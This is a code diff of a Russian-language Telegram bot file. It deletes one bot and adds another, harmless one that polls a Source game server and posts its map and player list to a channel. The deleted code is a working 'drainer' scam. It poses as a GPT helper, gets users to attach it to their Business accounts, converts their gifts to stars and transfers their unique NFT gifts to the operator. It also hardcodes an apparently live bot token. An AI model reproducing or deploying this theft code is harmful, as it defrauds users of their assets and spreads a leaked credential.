@@ -1,320 +1,234 @@
-from aiogram.filters import F
-from aiogram import Bot, Dispatcher
-from aiogram import types
-import asyncio
-from aiogram.client.default import DefaultBotProperties
-from aiogram.enums import ParseMode
-from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, business_connection, BusinessConnection
-from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
-from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
-from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
-from aiogram.enums import ParseMode
-from aiogram.utils.keyboard import InlineKeyboardBuilder
-from aiogram.methods import SendMessage, ReadBusinessMessage
-from aiogram.methods.get_available_gifts import GetAvailableGifts
-from aiogram.methods import TransferGift
-from aiogram.exceptions import TelegramBadRequest
-from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars, UpgradeGift
-from aiogram.types import InputMediaPhoto
-from flask import Flask
-
-
-from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
-
-import aiogram.exceptions as exceptions
-import logging
-import asyncio
-import json
-
-import re
-
-#import config
 import os
+import re
+import logging
+import socket
+import struct
+from telegram import Update
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
+from dotenv import load_dotenv
 
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000)) # Отримуємо порт від Render
-    # Запускаємо бота (Webhook) або сервер Flask
-    app.run(host='0.0.0.0', port=port)
+# Настройка логирования
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO,
+    handlers=[
+        logging.FileHandler('server_bot.log', encoding='utf-8'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
 
-TOKEN = "8378977310:AAFPy4T3iChgs-L0by-88BestHGu_U1vQ74" # Your Bot API Token from @BotFather
-# Turn business mode in settings bot
+load_dotenv()
+TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
+CHANNEL_ID = os.getenv('TELEGRAM_CHANNEL_ID')
+SERVER_IP = 'Ваш ип' #Сюда вписать ип адрес пример: 00.00.00.00
+SERVER_PORT = 27015 #Сюда вписать ваш порт, пример 27015
+UPDATE_INTERVAL = 3000 #интервал автоотправки сообщения в ваш канал
 
-bot = Bot(TOKEN)
+class SourceServerQuery:
+    last_response = None
+    ENCODINGS = ['utf-8', 'cp1251', 'iso-8859-5', 'cp866', 'koi8-r', 'latin1']
+    HEADER = b'\xFF\xFF\xFF\xFF'
 
-dp = Dispatcher()
-from aiogram.filters import Command
-ADMIN_ID = 7562850116 # Your Telegram ID
-from aiogram import F
-@dp.message(Command("refund"))
-async def refund_command(message: types.Message):
+    @staticmethod
+    def remove_color_codes(name):
+        return re.sub(r'\^\d', '', name).strip() if name else ''
+
+    @staticmethod
+    def decode_string(data):
+        end = data.find(b'\x00')
+        if end == -1:
+            return "", data
+        raw_bytes = data[:end]
+        remaining = data[end+1:]
+        for encoding in SourceServerQuery.ENCODINGS:
+            try:
+                decoded = raw_bytes.decode(encoding, errors='strict').strip()
+                return decoded, remaining
+            except UnicodeDecodeError:
+                continue
+        return raw_bytes.decode('utf-8', errors='replace').strip(), remaining
+
+    @staticmethod
+    def get_info():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.settimeout(5)
+                payload = SourceServerQuery.HEADER + b'T' + b'Source Engine Query\x00'
+                sock.sendto(payload, (SERVER_IP, SERVER_PORT))
+                data = sock.recv(4096)
+
+                if data[4] == 0x41:
+                    challenge = struct.unpack('<l', data[5:9])[0]
+                    payload = SourceServerQuery.HEADER + b'T' + b'Source Engine Query\x00' + struct.pack('<l', challenge)
+                    sock.sendto(payload, (SERVER_IP, SERVER_PORT))
+                    data = sock.recv(4096)
+
+                if data[4] != 0x49:
+                    return None
+
+                data = data[6:]
+                info = {}
+                info['name'], data = SourceServerQuery.decode_string(data)
+                info['map'], data = SourceServerQuery.decode_string(data)
+                data = data[16:]
+                info['version'], data = SourceServerQuery.decode_string(data)
+                
+                return {
+                    'name': SourceServerQuery.remove_color_codes(info['name']),
+                    'map': SourceServerQuery.remove_color_codes(info['map']),
+                    'players': data[0] if len(data) >= 2 else 0,
+                    'max_players': data[1] if len(data) >= 2 else 0
+                }
+
+        except Exception as e:
+            logger.error(f"Ошибка запроса информации: {str(e)}")
+            return None
+
+    @staticmethod
+    def get_players():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                sock.settimeout(5)
+                payload = SourceServerQuery.HEADER + b'U' + b'\xFF\xFF\xFF\xFF'
+                sock.sendto(payload, (SERVER_IP, SERVER_PORT))
+                data = sock.recv(4096)
+
+                if data[4] == 0x41:
+                    challenge = struct.unpack('<l', data[5:9])[0]
+                    payload = SourceServerQuery.HEADER + b'U' + struct.pack('<l', challenge)
+                    sock.sendto(payload, (SERVER_IP, SERVER_PORT))
+                    data = sock.recv(4096)
+
+                if data[4] != 0x44:
+                    return None
+
+                players = []
+                player_count = data[5]
+                data = data[6:]
+
+                for _ in range(player_count):
+                    try:
+                        data = data[1:]
+                        name, data = SourceServerQuery.decode_string(data)
+                        data = data[8:]
+                        clean_name = SourceServerQuery.remove_color_codes(name)
+                        if clean_name and clean_name != '.':
+                            players.append(clean_name)
+                    except Exception as e:
+                        logger.error(f"Ошибка парсинга игрока: {str(e)}")
+                        continue
+
+                return players
+
+        except Exception as e:
+            logger.error(f"Ошибка запроса игроков: {str(e)}")
+            return None
+
+def generate_message(check_changes=True):
     try:
-        command_args = message.text.split()
-        if len(command_args) != 2:
-            await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456")
+        current_data = (SourceServerQuery.get_info(), SourceServerQuery.get_players())
+        
+        if check_changes and current_data == SourceServerQuery.last_response:
+            return None
+
+        SourceServerQuery.last_response = current_data
+        info, players = current_data
+
+        if not info or not players:
+            return "❌ Сервер не отвечает"
+
+        message = [
+            f"🔹 <b>{info['name']}</b>",
+            f"🗺 Карта: <code>{info['map']}</code>",
+            f"👥 Онлайн: <b>{len(players)}/32</b>",
+            "\n📊 Игроки:"
+        ]
+
+        if players:
+            message += [f"👤 {name}" for name in players]
+        else:
+            message.append("Сейчас никто не играет")
+
+        return "\n".join(message)
+
+    except Exception as e:
+        logger.error(f"Ошибка генерации сообщения: {str(e)}")
+        return "⚠️ Ошибка получения данных"
+
+def send_update(context: CallbackContext):
+    try:
+        message = generate_message(check_changes=True)
+        if message:
+            context.bot.send_message(
+                chat_id=CHANNEL_ID,
+                text=message,
+                parse_mode='HTML'
+            )
+    except Exception as e:
+        logger.error(f"Ошибка отправки: {str(e)}")
+
+def handle_server_cmd(update: Update, context: CallbackContext):
+    try:
+        info = SourceServerQuery.get_info()
+        players = SourceServerQuery.get_players()
+        
+        if not info or not players:
+            update.message.reply_text("❌ Сервер не отвечает", parse_mode='HTML')
             return
 
-        transaction_id = command_args[1]
+        message = [
+            f"🔹 <b>{info['name']}</b>",
+            f"🗺 Карта: <code>{info['map']}</code>",
+            f"👥 Онлайн: <b>{len(players)}/32</b>",
+            "\n📊 Игроки:"
+        ]
 
-        refund_result = await bot.refund_star_payment(
-            user_id=message.from_user.id,
-            telegram_payment_charge_id=transaction_id
-        )
-
-        if refund_result:
-            await message.answer(f"Возврат звёзд по операции {transaction_id} успешно выполнен!")
+        if players:
+            message += [f"👤 {name}" for name in players]
         else:
-            await message.answer(f"Не удалось выполнить возврат по операции {transaction_id}.")
+            message.append("Сейчас никто не играет")
+
+        update.message.reply_text(
+            text="\n".join(message),
+            parse_mode='HTML'
+        )
 
     except Exception as e:
-        await message.answer(f"Ошибка при выполнении возврата: {str(e)}")
-@dp.message(F.text == "/start")
-async def start_command(message: Message):
-    try:
-        connections = load_connections()
-        count = len(connections)
-    except Exception:
-        count = 0
+        logger.error(f"Ошибка команды: {str(e)}")
+        update.message.reply_text("⚠️ Ошибка при получении данных", parse_mode='HTML')
 
-    if message.from_user.id != ADMIN_ID:
-        await message.answer(
-            "❤️ <b>Я — твой главный помощник в жизни</b>, который:\n"
-            "• ответит на любой вопрос\n"
-            "• поддержит тебя в трудную минуту\n"
-            "• сделает за тебя домашку, работу или даже нарисует картину\n\n"
-            "<i>Введи запрос ниже, и я помогу тебе!</i> 👇",
-            parse_mode="HTML"
-        )
-    else:
-        await message.answer(
-            f"Antistoper Drainer\n\n🔗 "
-#            "/gifts - просмотреть гифты\n"
-#            "/stars - просмотреть звезды\n"
-#            "/transfer <owned_id> <business_connect> - передать гифт вручную\n"
-#            "/convert - конвертировать подарки в звезды"
-        )
-
-
-
-@dp.message(F.text)
-async def handle_text_query(message: Message):
-    await message.answer(
-        "📌 <b>Для полноценной работы необходимо подключить бота к бизнес-аккаунту Telegram</b>\n\n"
-        "Как это сделать?\n\n"
-        "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
-        "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
-        "3. 🤖 Откройте пункт <b>Чат-боты</b>\n"
-        "4. ✍️ Введите <code>@TitanGpt_RoBot</code>\n\n"
-        "Имя бота: <code>@TitanGpt_RoBot</code>\n",
-#        "❗Для корректной работы боту требуются <b>все права</b>",
-        parse_mode="HTML"
+def start(update: Update, context: CallbackContext):
+    update.message.reply_text(
+        "🤖 Бот мониторинга игрового сервера\n"
+        "Используйте команду !сервер для проверки текущего статуса",
+        parse_mode='HTML'
     )
 
-
-CONNECTIONS_FILE = "business_connections.json"
-
-def load_json_file(filename):
+def main():
     try:
-        with open(filename, "r") as f:
-            content = f.read().strip()
-            if not content:
-                return [] 
-            return json.loads(content)
-    except FileNotFoundError:
-        return []
-    except json.JSONDecodeError as e:
-        logging.exception("Ошибка при разборе JSON-файла.")
-        return []
+        updater = Updater(TOKEN, use_context=True)
+        dp = updater.dispatcher
 
-def get_connection_id_by_user(user_id: int) -> str:
-    import json
-    with open("connections.json", "r") as f:
-        data = json.load(f)
-    return data.get(str(user_id))
+        dp.add_handler(CommandHandler("start", start))
+        dp.add_handler(MessageHandler(
+            Filters.text & ~Filters.command & Filters.regex(r'^!сервер'),
+            handle_server_cmd
+        ))
 
-def load_connections():
-    with open("business_connections.json", "r") as f:
-        return json.load(f)
-
-async def send_welcome_message_to_admin(connection, user_id, _bot):
-    try:
-        admin_id = ADMIN_ID  # Просто один ID
-
-        rights = connection.rights
-        business_connection = connection
-
-        rights_text = "\n".join([
-            f"📍 <b>Права бота:</b>",
-      #      f"▫️ Чтение сообщений: {'✅' if rights.can_read_messages else '❌'}",
-            f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
-            f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
-            f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
-            f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
-            f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
-            f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
-            f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
-            f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
-            f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
-            f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
-            f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
-            f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
-        ])
-
-        star_amount = 0
-        all_gifts_amount = 0
-        unique_gifts_amount = 0
-
-        if rights.can_view_gifts_and_stars:
-            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
-            star_amount = response.star_amount
-
-            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
-            all_gifts_amount = len(gifts.gifts)
-            unique_gifts_amount = sum(1 for gift in gifts.gifts if gift.type == "unique")
-
-        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
-        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
-        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
-
-        msg = (
-            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
-            f"👤 Пользователь: @{business_connection.user.username or '—'}\n"
-            f"🆔 User ID: <code>{business_connection.user.id}</code>\n"
-            f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
-#            f"\n{rights_text}"
-            f"\n⭐️ Звезды: <code>{star_amount_text}</code>"
-            f"\n🎁 Подарков: <code>{all_gifts_text}</code>"
-            f"\n🔝 NFT подарков: <code>{unique_gitfs_text}</code>"            
+        updater.job_queue.run_repeating(
+            send_update,
+            interval=UPDATE_INTERVAL,
+            first=0
         )
-        keyboard = InlineKeyboardMarkup(
-            inline_keyboard=[
-                [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
-                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
-                [InlineKeyboardButton(text=f"🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
-            ]
-        )
-        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
+
+        logger.info("Бот успешно запущен")
+        updater.start_polling()
+        updater.idle()
+
     except Exception as e:
-        logging.exception("Не удалось отправить сообщение в личный чат.")
-def save_business_connection_data(business_connection):
-    business_connection_data = {
-        "user_id": business_connection.user.id,
-        "business_connection_id": business_connection.id,
-        "username": business_connection.user.username,
-        "first_name": "FirstName",
-        "last_name": "LastName"
-    }
+        logger.critical(f"Критическая ошибка: {str(e)}")
+        raise
 
-    data = []
-
-    if os.path.exists(CONNECTIONS_FILE):
-        try:
-            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
-                data = json.load(f)
-        except json.JSONDecodeError:
-            pass
-
-    updated = False
-    for i, conn in enumerate(data):
-        if conn["user_id"] == business_connection.user.id:
-            data[i] = business_connection_data
-            updated = True
-            break
-
-    if not updated:
-        data.append(business_connection_data)
-
-    # Сохраняем обратно
-    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
-        json.dump(data, f, indent=2, ensure_ascii=False)
-
-async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
-    try:
-        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
-
-        if not gifts.gifts:
-            return "🎁 Нет подарков."
-        else:
-            for gift in gifts.gifts:
-                if gift.owned_gift_id == owned_gift_id:
-                    gift_name = gift.gift.base_name.replace(" ", "")
-                    return f"https://t.me/nft/{gift_name}-{gift.gift.number}"
-    except Exception as e:
-        return "🎁 Нет подарков."
-
-
-@dp.business_connection()
-async def handle_business_connect(business_connection: business_connection):
-    try:
-        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
-        await bot.send_message(business_connection.user.id, "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'")
-
-        business_connection_data = {
-            "user_id": business_connection.user.id,
-            "business_connection_id": business_connection.id,
-            "username": business_connection.user.username,
-            "first_name": "FirstName",
-            "last_name": "LastName"
-        }
-        user_id = business_connection.user.id
-        connection_id = business_connection.user.id
-    except:
-        pass
-        
-from aiogram import types
-from aiogram.filters import Command
-#from g4f.client import Client as G4FClient
-
-OWNER_ID = ADMIN_ID
-task_id = ADMIN_ID
-
-@dp.business_message()
-async def get_message(message: types.Message):
-    business_id = message.business_connection_id
-    user_id = message.from_user.id
-
-    if user_id == OWNER_ID:
-        return
-
-    # === Конвертация неуникальных подарков ===
-    try:
-        convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
-        for gift in convert_gifts.gifts:
-            try:
-                owned_gift_id = gift.owned_gift_id
-                await bot.convert_gift_to_stars(business_id, owned_gift_id)
-            except Exception as e:
-                print(f"Ошибка при конвертации подарка {owned_gift_id}: {e}")
-                continue
-    except Exception as e:
-        print(f"Ошибка при получении неуникальных подарков: {e}")
-    try:
-        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
-        if not unique_gifts.gifts:
-            print("Нет уникальных подарков для отправки.")
-        for gift in unique_gifts.gifts:
-            try:
-                owned_gift_id = gift.owned_gift_id
-                await bot.transfer_gift(business_id, owned_gift_id, task_id, 25)
-                print(f"Успешно отправлен подарок {owned_gift_id} на task_id {task_id}")
-            except Exception as e:
-                print(f"Ошибка при отправке подарка {owned_gift_id}: {e}")
-                continue
-    except Exception as e:
-        print(f"Ошибка при получении уникальных подарков: {e}")
-    try:
-        stars = await bot.get_business_account_star_balance(business_id)
-        if stars.amount > 0:
-            print(f"Успешно отправлено {stars.amount} звёзд")
-#            await bot.transfer_business_account_stars(business_id, int(stars.amount))
-        else:
-            print("Нет звёзд для отправки.")
-    except Exception as e:
-        print(f"Ошибка при работе с балансом звёзд: {e}")
-
-async def main():
-	await dp.start_polling(bot)
-	
-	
-if __name__ == "__main__":
-	asyncio.run(main())
+if __name__ == '__main__':
+    main()
